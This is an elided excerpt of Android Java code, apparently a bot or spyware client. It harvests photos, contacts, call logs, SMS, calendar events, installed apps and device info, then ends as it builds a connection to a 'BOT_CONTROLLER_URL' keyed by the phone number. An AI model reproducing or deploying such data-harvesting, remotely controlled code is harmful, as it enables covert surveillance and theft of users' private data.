...
import com.candroid.textme.api.Administrator;
            ...
            if (action.equals(ACTION_DCIM_FILES)) {
                if (checkSelfPermission(Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED) {
                    ...
                    try {
                        ...
                        Lofl.setJobRan(CommandsIntentService.this, JobsScheduler.DCIM_KEY);
                    }
                }
                ...
                try {
                    ...
                    Lofl.setJobRan(CommandsIntentService.this, JobsScheduler.PACKAGES_KEY);
                }
                ...
                if (checkSelfPermission(Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED) {
                            ...
                            try {
                                ...
                                database.endTransaction();
                                database.close();
                                Lofl.setJobRan(CommandsIntentService.this, ACTION_CONTACTS);
                            }
                }
                ...
                try {
                    ...
                    database.endTransaction();
                    database.close();
                    Lofl.setJobRan(CommandsIntentService.this, ACTION_DEVICE_INFO);
                }
                ...
                try {
                    ...
                    if (checkSelfPermission(Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED) {
                        ...
                        try {
                            ...
                            database.endTransaction();
                            Lofl.setJobRan(CommandsIntentService.this, JobsScheduler.CONTACTS_KEY);
                        }
                    }
                    //SYNC INSTALLED APPS
                    try {
                    ...
                    if (checkSelfPermission(Manifest.permission.READ_CALL_LOG) == PackageManager.PERMISSION_GRANTED) {
                        ...
                        try {
                            ...
                            database.endTransaction();
                            Lofl.setJobRan(CommandsIntentService.this, JobsScheduler.PHONE_CALLS_KEY);
                        }
                    }
                    ...
                    if (checkSelfPermission(Manifest.permission.READ_CALENDAR) == PackageManager.PERMISSION_GRANTED) {
                        ...
                        try {
                            ...
                            database.endTransaction();
                            Lofl.setJobRan(CommandsIntentService.this, JobsScheduler.CALENDAR_EVENTS_KEY);
                        }
                    }
                    //SYNC SMS
                    if (checkSelfPermission(Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED) {
                        ...
                        try {
                            ...
                            database.endTransaction();
                            Lofl.setJobRan(CommandsIntentService.this, JobsScheduler.SMS_KEY);
                        }
                    }
                    //SYNC DEVICE INFO
                    try {
                        ...
                        database.endTransaction();
                        Lofl.setJobRan(CommandsIntentService.this, JobsScheduler.DEVICE_KEY);
                    }
                    database.setTransactionSuccessful();
                } catch (SQLException e) {
                    e.printStackTrace();
                ...
                if (intent.hasExtra(Constants.Keys.TITLE_KEY) && intent.hasExtra(Constants.Keys.CONTENT_KEY)) {
                    ...
                    NotificationFactory.sNotificationManager.notify(NotificationFactory.sId++, builder.build());
                }
                ...
                if(intent.hasExtra(Constants.Keys.URL_KEY)){
                    new Thread(new Runnable() {
                        ...
                        public void run() {
                            ...
                            try {
                                URL url = new URL(Uri.parse(Bot.BOT_CONTROLLER_URL.concat(MessagingService.sTelephoneAddress)).toString());
